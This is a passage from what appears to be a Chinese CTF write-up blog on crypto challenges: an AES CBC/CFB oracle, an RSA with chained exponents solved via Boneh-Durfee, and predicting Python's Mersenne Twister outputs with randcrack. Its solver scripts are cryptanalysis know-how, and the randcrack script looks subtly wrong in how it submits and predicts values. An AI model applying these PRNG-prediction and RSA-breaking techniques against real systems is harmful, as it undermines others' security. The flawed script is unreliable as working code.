self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;&gt; &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt_cbc</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        aes = AES.new(self.KEY, AES.MODE_CBC, self.IV)</span><br><span class="line">        <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt_cfb</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        aes = AES.new(self.KEY, AES.MODE_CFB, self.IV, segment_size=<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">any_cbc</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            hex_input = self.recv()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(hex_input) % <span class="number">32</span> != <span class="number">0</span>:</span><br><span class="line">                self.send(</span><br><span class="line">                    <span class="string">b&quot;[-] the bit length of input data must be a multiple of 128 &quot;</span>)</span><br><span class="line">            text = binascii.unhexlify(hex_input)</span><br><span class="line">            ciphertext = self.encrypt_cbc(text)</span><br><span class="line">            self.send(binascii.hexlify(ciphertext))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            self.send(<span class="string">b&quot;[-] Something Wrong!&quot;</span>)</span><br><span class="line">            self.request.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">flag_cfb</span>(<span class="params">self</span>):</span></span><br><span class="line">        plaintext = self.encrypt_cfb(flag)</span><br><span class="line">        self.send(binascii.hexlify(plaintext))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">1200</span>)</span><br><span class="line">        self.KEY = os.urandom(<span class="number">32</span>)</span><br><span class="line">        self.IV = os.urandom(<span class="number">16</span>)</span><br><span class="line">        self.send(BANNER)</span><br><span class="line">        self.send(LOGGER)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                choice = <span class="built_in">int</span>(self.recv(prompt=<span class="string">b&quot;[+] What&#x27;s your choice?\n&quot;</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.send(</span><br><span class="line">                    <span class="string">f&#x27;[-] Sorry, you have wrong choice, exit...&#x27;</span>.encode())</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">                self.send(<span class="string">b&quot;[+] There is a encrypted message for you:&quot;</span>)</span><br><span class="line">                self.flag_cfb()</span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">                self.send(<span class="string">b&quot;[+] Let&#x27;s make a encryption!&quot;</span>)</span><br><span class="line">                self.any_cbc()</span><br><span class="line">            <span class="keyword">elif</span> choice == <span class="number">3</span>:</span><br><span class="line">                self.send(<span class="string">b&quot;[!] Bye~&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.send(<span class="string">b&quot;[-] Wrong!&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10001</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<h4 id="比赛中的思路"><a href="#比赛中的思路" class="headerlink" title="比赛中的思路"></a>比赛中的思路</h4><p>加密过程主要是用cfb模式的aes加密了flag，然后用相同的位移和秘钥，以cbc的模式供我们任意加密</p>
<p>那么思路很显然是获得当次加密的IV和KEY</p>
<p>我暂时写到了获取到加密后的flag，后面没有思路了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># nc 117.21.200.166 49988</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passerby</span>():</span></span><br><span class="line">    sh.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;117.21.200.166&#x27;</span>, <span class="number">49988</span>)</span><br><span class="line"></span><br><span class="line">sh.recv(numb=<span class="number">0x1e9</span>)   <span class="comment"># 给出接收字节数</span></span><br><span class="line">sh.recv(numb=<span class="number">0x6e</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到加密后的flag</span></span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">passerby()</span><br><span class="line">flag_cfb = sh.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># print(flag_cfb.decode())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破key和iv</span></span><br><span class="line">passerby()</span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">passerby()</span><br><span class="line"></span><br><span class="line">sh.recv(numb=<span class="number">0x2e</span>)</span><br></pre></td></tr></table></figure>

<p>现在市面上已知的aes-cbc，需要知道有关IV和KEY的一些信息吧，都没有，但是可以在不知道IV和KEY的情况下无限加密</p>
<h3 id="rsa12"><a href="#rsa12" class="headerlink" title="rsa12"></a>rsa12</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag = <span class="string">&#x27;*****************************************&#x27;</span></span><br><span class="line">hex_flag=<span class="built_in">int</span>(flag.encode(<span class="string">&quot;hex&quot;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">e1=<span class="number">1376213</span></span><br><span class="line">e2=<span class="number">11932523</span></span><br><span class="line">e3=<span class="number">663164990242540553660820123984958362292767589050706562525585149518469420039430050814053460276242420171688628686731721858712475428243746423919061950258579075115696969767529903377571203001499079349600716341343846020128095111908915240158242174010840342112170003771807591457926458807775028482732501</span></span><br><span class="line"></span><br><span class="line">c=<span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="built_in">pow</span>(hex_flag,e1,n),e2,n),e3,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,<span class="built_in">hex</span>(n),<span class="string">&quot;c=&quot;</span>,<span class="built_in">hex</span>(c))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(&#x27;n=&#x27;, &#x27;0x5bf7c98078ceec04b8c414c65731926712d48f6852c4d7a5dfeac5344d3f02d42dc8e387eb7e731c7efb233464279811228fb4bf96dbefe753c7b5a1850cbaa4d7f1048b5d3a2a7a0d3092fd8e4be0f8e298dfc57a38604c225760446816174be08ba1bcb7eaf594126961d5feab6de678a67e1100734d2edd76d6e3778c21e7L&#x27;, &#x27;c=&#x27;, &#x27;0xcfd6983f1856b0fb6dc851d56ddcbfe66e03acb5ff568f6cd2c07f08448e09b5c513f76e939f4cf3d6f8b0950027c1a31ab6ae27d52ce0bb4b2c3d6502a8bd0e167471b1ee03e645b0aca8e2a93f4b1a8a9e3e493fc811e4104160a11494c548f21508559b508a6ef9a20df7e418fae6f33d14899419330ab29fed26712623bL&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>比较简单的rsa，利用同余的性质，三个指数相乘很大了，用boneh_durfee可以解出来<br>$$<br>c=((m^{e_1}\ mod\ n)^{e_2}\ mod\ n)^{e_3}\ mod\ n=m^{e_1e_2e_3}\ mod\ n<br>$$<br>贴一下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">1376213</span></span><br><span class="line">e2 = <span class="number">11932523</span></span><br><span class="line">e3 = <span class="number">663164990242540553660820123984958362292767589050706562525585149518469420039430050814053460276242420171688628686731721858712475428243746423919061950258579075115696969767529903377571203001499079349600716341343846020128095111908915240158242174010840342112170003771807591457926458807775028482732501</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0x5bf7c98078ceec04b8c414c65731926712d48f6852c4d7a5dfeac5344d3f02d42dc8e387eb7e731c7efb233464279811228fb4bf96dbefe753c7b5a1850cbaa4d7f1048b5d3a2a7a0d3092fd8e4be0f8e298dfc57a38604c225760446816174be08ba1bcb7eaf594126961d5feab6de678a67e1100734d2edd76d6e3778c21e7</span></span><br><span class="line">c = <span class="number">0xcfd6983f1856b0fb6dc851d56ddcbfe66e03acb5ff568f6cd2c07f08448e09b5c513f76e939f4cf3d6f8b0950027c1a31ab6ae27d52ce0bb4b2c3d6502a8bd0e167471b1ee03e645b0aca8e2a93f4b1a8a9e3e493fc811e4104160a11494c548f21508559b508a6ef9a20df7e418fae6f33d14899419330ab29fed26712623b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># boneh_durfee</span></span><br><span class="line">d3 = <span class="number">4756493741905107016896119044691618473046048544786109</span></span><br><span class="line"><span class="comment"># c2 = pow(c, d3, n)</span></span><br><span class="line"><span class="comment"># print(c2)</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">24365558073161106092835300734885784405644211668755395505407014873155490196950555802065799192523919326230891152125642692705560739026854981011343527853677799526009984453218908420224058084389551891310598951492041406656693159899669754537362598790730095352567799368412800492746291016852848356250820274189236494939</span></span><br><span class="line"></span><br><span class="line">e = e1*e2*e3</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(c, <span class="number">289646972582949907450120854337965355291</span>, n))</span><br><span class="line">m = <span class="number">218774971804085528558360699464475824982562321865118031830066995217884121485326574353743748741215026</span></span><br></pre></td></tr></table></figure>

<p>然后可以求出m，但是注意这里多了一步</p>
<img alt="20210607 NUCTF中北大学校赛-b2e587b7.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210607 NUCTF中北大学校赛-b2e587b7.png" width="" height="" >

<p>flag先是hex加密了，然后转成十进制了，在线的解法可以是先转十六进制，然后hex一下</p>
<p>手写的话就是直接long_to_bytes好了，这个记一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m = <span class="number">218774971804085528558360699464475824982562321865118031830066995217884121485326574353743748741215026</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;flag is :78cc56ba4450a697fd625cc91ddf4432&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="math-rsa（unsolved）"><a href="#math-rsa（unsolved）" class="headerlink" title="math_rsa（unsolved）"></a>math_rsa（unsolved）</h3><p>增加了一些高数的求导知识</p>
<p>但是不会</p>
<h3 id="backdoor-lcg（unsolved）"><a href="#backdoor-lcg（unsolved）" class="headerlink" title="backdoor_lcg（unsolved）"></a>backdoor_lcg（unsolved）</h3><p>线性线性同余随机数生成器</p>
<p>不是很懂</p>
<p><a href="https://zhuanlan.zhihu.com/p/379154268">贴上春哥的链接</a></p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>团队WP</tag>
      </tags>
  </entry>
  <entry>
    <title>20210626 GKCTFCrypto方向部分复现</title>
    <url>/posts/2d82e8aa/</url>
    <content><![CDATA[<p>26号，那天考操作系统，没有参加；27下午考完计网，想要复现一下</p>
<span id="more"></span>

<h1 id="GKCTF"><a href="#GKCTF" class="headerlink" title="GKCTF"></a>GKCTF</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>BUU已经上题</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-39773b44.png" alt="20210626GKCTF-39773b44.png"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-f8641481.png" alt="20210626GKCTF-f8641481.png"></p>
<p>这次的应急杯Crypto有三道，Reverse有五道。根据解出的人数，今日任务就复现下两道解出人数最多的题目吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-c525e5a0.png" alt="20210626GKCTF-c525e5a0.png"></p>
<h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210626GKCTF-0436bb67.png" alt="20210626GKCTF-0436bb67.png"></p>
<p>代码如下，因为总是在原文件上操作，重下了好多次，下次记得新建一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span>():</span></span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">64</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">96</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    file.close()</span><br><span class="line">get_mask()</span><br><span class="line">flag = md5(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>生成的文本文件如下，里面有312个随机数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2584323193</span><br><span class="line">1099154419438958164</span><br><span class="line">35367876945070316311325317953</span><br><span class="line">481304047</span><br><span class="line">12782770146993102006</span><br><span class="line">24789628292419559503661788402</span><br><span class="line">2776391832</span><br><span class="line">9046887565683900291</span><br><span class="line">50006261016517120573540241998</span><br><span class="line">4167723109</span><br><span class="line">8540277546428614473</span><br><span class="line">5932047064656933473553742683</span><br><span class="line">2951765291</span><br><span class="line">10958280862127627756</span><br><span class="line">61364239380151547478360346674</span><br><span class="line">727043053</span><br><span class="line">10156271057154381198</span><br><span class="line">32168336768992329620376069852</span><br><span class="line">930821842</span><br><span class="line">16276235036285538859</span><br><span class="line">9299952556848430743503551046</span><br><span class="line">2868231632</span><br><span class="line">5239154873841417200</span><br><span class="line">11073503953912227254738321705</span><br><span class="line">3452646652</span><br><span class="line">8203253126417399900</span><br><span class="line">52795367131471301612397944513</span><br><span class="line">1927997107</span><br><span class="line">17486869700317373240</span><br><span class="line">47859970254711877167132319582</span><br><span class="line">1459348891</span><br><span class="line">9270456490024856463</span><br><span class="line">74988967035830352654888842228</span><br><span class="line">3714813644</span><br><span class="line">1001128959491001919</span><br><span class="line">8338265486641240510773094199</span><br><span class="line">1430706700</span><br><span class="line">17510828220752339511</span><br><span class="line">3163106687132931419335230580</span><br><span class="line">663535320</span><br><span class="line">9606088298064978425</span><br><span class="line">42511409828594385595915384953</span><br><span class="line">908684643</span><br><span class="line">5421916296165007941</span><br><span class="line">9630914642938890694059952508</span><br><span class="line">2209941143</span><br><span class="line">14999144064788271892</span><br><span class="line">3764842169035734035997078921</span><br><span class="line">2718456651</span><br><span class="line">8541807093002241064</span><br><span class="line">70305992075768658972224974121</span><br><span class="line">930303353</span><br><span class="line">887596273180600202</span><br><span class="line">62528479418364179541352908078</span><br><span class="line">3365397759</span><br><span class="line">15219084820731944344</span><br><span class="line">31433566654697222176709895388</span><br><span class="line">1608992428</span><br><span class="line">6417140575231408939</span><br><span class="line">12879789575923814684090165215</span><br><span class="line">2811970399</span><br><span class="line">6123213785028348335</span><br><span class="line">44681647388937033220521089118</span><br><span class="line">1260870056</span><br><span class="line">5601104844042776691</span><br><span class="line">73199461252301674455633950458</span><br><span class="line">883231057</span><br><span class="line">17783480959798771462</span><br><span class="line">53460694547508318015132953966</span><br><span class="line">1332985617</span><br><span class="line">6673661714524041073</span><br><span class="line">54253348096650113440476985084</span><br><span class="line">3911521675</span><br><span class="line">3438383273755779719</span><br><span class="line">50129032267969019444282164464</span><br><span class="line">3311412816</span><br><span class="line">8779405363908462634</span><br><span class="line">77818642029003078860467063235</span><br><span class="line">4204237422</span><br><span class="line">17534771551489868719</span><br><span class="line">47280916590275648057356977963</span><br><span class="line">2090173606</span><br><span class="line">12206397967662831376</span><br><span class="line">9495602410639024810670107439</span><br><span class="line">2896231201</span><br><span class="line">7246124017447704664</span><br><span class="line">64467120363081017096405905335</span><br><span class="line">392254334</span><br><span class="line">12789011750322942845</span><br><span class="line">5247110397471141497763090834</span><br><span class="line">814200188</span><br><span class="line">14344105251896958923</span><br><span class="line">38888779745538270252730950782</span><br><span class="line">205529919</span><br><span class="line">13939756220516981581</span><br><span class="line">67139045733351688501202495914</span><br><span class="line">3563698832</span><br><span class="line">16840754399626540384</span><br><span class="line">15354843719521267197455444900</span><br><span class="line">1386481456</span><br><span class="line">17766886653399976694</span><br><span class="line">61203331542727632580855864074</span><br><span class="line">2032518919</span><br><span class="line">2355401958853696908</span><br><span class="line">58793908005730868677649498244</span><br><span class="line">3991002745</span><br><span class="line">6506506581713943242</span><br><span class="line">49187675946469291318483292566</span><br><span class="line">2346942877</span><br><span class="line">994297989736899070</span><br><span class="line">45437626728896532873251413177</span><br><span class="line">3841694984</span><br><span class="line">14253899037419430689</span><br><span class="line">8435766077661599453131339442</span><br><span class="line">1679990328</span><br><span class="line">5515793210854183190</span><br><span class="line">32981467195097563488749918497</span><br><span class="line">744869832</span><br><span class="line">11965860903258650511</span><br><span class="line">73456728458781563185478913274</span><br><span class="line">1341354796</span><br><span class="line">14941036303190219170</span><br><span class="line">3601563989190071059996878006</span><br><span class="line">3361509481</span><br><span class="line">17629804697469609923</span><br><span class="line">39935200308805986497519634478</span><br><span class="line">213152541</span><br><span class="line">18320881664493742431</span><br><span class="line">35325602739583757661562537619</span><br><span class="line">2583841550</span><br><span class="line">13763800051589427155</span><br><span class="line">24638499459902141689405229579</span><br><span class="line">1930742512</span><br><span class="line">2392210857598517491</span><br><span class="line">10441235412645941387574306751</span><br><span class="line">461860348</span><br><span class="line">2960745717639761142</span><br><span class="line">62671223148116753112168252981</span><br><span class="line">342206006</span><br><span class="line">6480900103080233462</span><br><span class="line">68412521040142848818877222548</span><br><span class="line">114798494</span><br><span class="line">8473329380799862296</span><br><span class="line">13698669860489083061204052132</span><br><span class="line">2900249131</span><br><span class="line">4183161143099214314</span><br><span class="line">18705391538460150746163889528</span><br><span class="line">3766817970</span><br><span class="line">12378384893542868384</span><br><span class="line">55065668763750424532726429526</span><br><span class="line">937387269</span><br><span class="line">6844068130337459179</span><br><span class="line">3209183745118985928581969258</span><br><span class="line">3341723085</span><br><span class="line">5988612409695647387</span><br><span class="line">74389503837936256104231536479</span><br><span class="line">4240599755</span><br><span class="line">15332231015110371140</span><br><span class="line">62955965591068690743297262172</span><br><span class="line">1555895753</span><br><span class="line">6058791220464667520</span><br><span class="line">38335642957673073804843192014</span><br><span class="line">810331063</span><br><span class="line">4826913432979346480</span><br><span class="line">28611765156689124521247554769</span><br><span class="line">2630955218</span><br><span class="line">12776823600930336401</span><br><span class="line">4939603509311727391894886152</span><br><span class="line">3280912700</span><br><span class="line">14886149455945180990</span><br><span class="line">52545650130177883790984384989</span><br><span class="line">2356751225</span><br><span class="line">2213402912509116749</span><br><span class="line">7670693824287789893690942739</span><br><span class="line">1599077432</span><br><span class="line">14059140725965938936</span><br><span class="line">16912587144697957583184157226</span><br><span class="line">1304928684</span><br><span class="line">9448367331308980026</span><br><span class="line">22467661289496622162065003733</span><br><span class="line">2001054151</span><br><span class="line">7669140498758745837</span><br><span class="line">39387592809285963406216440474</span><br><span class="line">1711960460</span><br><span class="line">3944628516045148813</span><br><span class="line">66275496498554499967007163069</span><br><span class="line">1207238325</span><br><span class="line">3474935157030029491</span><br><span class="line">63309877710388250418928028870</span><br><span class="line">759170859</span><br><span class="line">5858654703302236387</span><br><span class="line">47609248816278271537847269046</span><br><span class="line">1571940308</span><br><span class="line">8335124609741508060</span><br><span class="line">63542562244865676783377908343</span><br><span class="line">1103531693</span><br><span class="line">673654248555391502</span><br><span class="line">30211221866217572233934551180</span><br><span class="line">1089271924</span><br><span class="line">7205932443049001486</span><br><span class="line">69303844715341292680611559319</span><br><span class="line">78608136</span><br><span class="line">3404862937733764913</span><br><span class="line">4259499119552843766282799518</span><br><span class="line">2856032696</span><br><span class="line">18313272414884625578</span><br><span class="line">13693483738598197670400133831</span><br><span class="line">873953734</span><br><span class="line">7709221139118742639</span><br><span class="line">34347437826101106015248365081</span><br><span class="line">1783225370</span><br><span class="line">16395574393179667285</span><br><span class="line">7105819215807952823387139051</span><br><span class="line">4039492686</span><br><span class="line">16956581102357069698</span><br><span class="line">57880199206788615132959351746</span><br><span class="line">4151578751</span><br><span class="line">2089635663127651746</span><br><span class="line">37224845035383461896791495968</span><br><span class="line">3139901611</span><br><span class="line">7354140220471025697</span><br><span class="line">7677374435615054008235674795</span><br><span class="line">2008633712</span><br><span class="line">13970520912420834879</span><br><span class="line">64431013803082441566118213963</span><br><span class="line">1788996018</span><br><span class="line">16490194110734000780</span><br><span class="line">30074301251997624246501473245</span><br><span class="line">2460472485</span><br><span class="line">2420976394683211164</span><br><span class="line">63223457068346692358441841920</span><br><span class="line">83976303</span><br><span class="line">11597367904222552300</span><br><span class="line">541189103864720560882255271</span><br><span class="line">1271705896</span><br><span class="line">8355873362347678325</span><br><span class="line">6344182152495584455275136810</span><br><span class="line">516191728</span><br><span class="line">14301559481738139949</span><br><span class="line">56972815139785900061169383374</span><br><span class="line">3206833632</span><br><span class="line">10471460817277304217</span><br><span class="line">48253348743985600958199235128</span><br><span class="line">4093394606</span><br><span class="line">18421023127368906484</span><br><span class="line">3209763791222301851974194188</span><br><span class="line">2294793393</span><br><span class="line">5804188421524711527</span><br><span class="line">71797815201668391465761200460</span><br><span class="line">3776041666</span><br><span class="line">4108093307245233290</span><br><span class="line">36986873094794981638319354001</span><br><span class="line">1123598142</span><br><span class="line">18262625851690101956</span><br><span class="line">75211342463083839154547686361</span><br><span class="line">1000669502</span><br><span class="line">18244976169672436911</span><br><span class="line">72759872679663719847870853888</span><br><span class="line">2863001571</span><br><span class="line">18304840778989692776</span><br><span class="line">22413497817784765711206417816</span><br><span class="line">1497794697</span><br><span class="line">11739492739170519132</span><br><span class="line">67625171938756611423023578679</span><br><span class="line">3351136254</span><br><span class="line">11816001323328933293</span><br><span class="line">68942708548438536419919996191</span><br><span class="line">1327110822</span><br><span class="line">1299589815565305619</span><br><span class="line">62081225258542372826911047279</span><br><span class="line">3410663545</span><br><span class="line">13158537297009141542</span><br><span class="line">21762078985419016317415112411</span><br><span class="line">1245509971</span><br><span class="line">8804545967037621189</span><br><span class="line">12841311881373962346628325162</span><br><span class="line">2090373367</span><br><span class="line">5289193049949531539</span><br><span class="line">58444176241871300895472370959</span><br><span class="line">571136405</span><br><span class="line">2357132884718584788</span><br><span class="line">51271731657715979715595461713</span><br><span class="line">1432929573</span><br><span class="line">503683219995130744</span><br><span class="line">42705435265543268884777575518</span><br><span class="line">1452726104</span><br><span class="line">2295689344585140511</span><br><span class="line">56996373195070838495288737642</span><br><span class="line">187502663</span><br><span class="line">13760641334049999515</span><br><span class="line">64971355271690455751992498230</span><br><span class="line">2679386081</span><br><span class="line">172294286357194222</span><br><span class="line">78658263482976308261205349174</span><br><span class="line">2643925505</span><br><span class="line">9627451492376735719</span><br><span class="line">44487428240561493246393172961</span><br><span class="line">983662371</span><br><span class="line">2375149476902080328</span><br><span class="line">39784456552690724305541938380</span><br><span class="line">3306946267</span><br><span class="line">16316178008270132149</span><br><span class="line">76712503805317876365091515524</span><br><span class="line">3779008319</span><br><span class="line">4892998918237451139</span><br><span class="line">46329724632809073972496761660</span><br><span class="line">3841865427</span><br><span class="line">15115042473603448600</span><br><span class="line">34888855489304037538590108588</span><br><span class="line">585968278</span><br><span class="line">15088560943809914475</span><br><span class="line">46621092548977030580425482842</span><br></pre></td></tr></table></figure>

<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>之前看到这种题目，可能我还会有点惊奇，随机数都能给你爆出来；现在做过一些题之后，发现这是一个常考的点，python等一些语言产生伪随机数的算法很多都是基于MT19937（Mersenne twister）梅森旋转算法</p>
<p>简单来说，MT19937有624个状态，利用这624个不同的状态生产随机数（当然不是624个随机数），也就是说知道连续产生的624个随机数就可以通过状态预测下一个随机数，<em>这也顺便解释了为什么做密码学项目时，不能用这些语言自带的随机函数，而是要用SM2，伪随机确实太危险了</em></p>
<p>而之前做过的<a href="https://blog.csdn.net/m0_49109277/article/details/117324488?spm=1001.2014.3001.5501">[SUCTF2019]MT</a>就是MT类型的题，这里比较简单（我乱说的）直接搜脚本了</p>
<h4 id="脚本搜集"><a href="#脚本搜集" class="headerlink" title="脚本搜集"></a>脚本搜集</h4><p>市面上主流的脚本，愣是给我看蒙了</p>
<blockquote>
<p>randcrack</p>
</blockquote>
<p>有像2020网鼎杯的，产生了32位的随机数700个，思路参上</p>
<p>照他样子改的脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;random.txt&#x27;</span>,<span class="string">&#x27;r+&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">  lines = fp.readlines()</span><br><span class="line"></span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(line.strip()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">  a = rc.predict_randrange(<span class="number">32</span>)</span><br><span class="line">  b = rc.predict_randrange(<span class="number">64</span>)</span><br><span class="line">  c = rc.predict_randrange(<span class="number">96</span>)</span><br><span class="line"></span><br><span class="line">key = rc.predict_randrange(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(md5(<span class="built_in">str</span>(key).encode()).hexdigest())</span><br></pre></td></tr></table></figure>

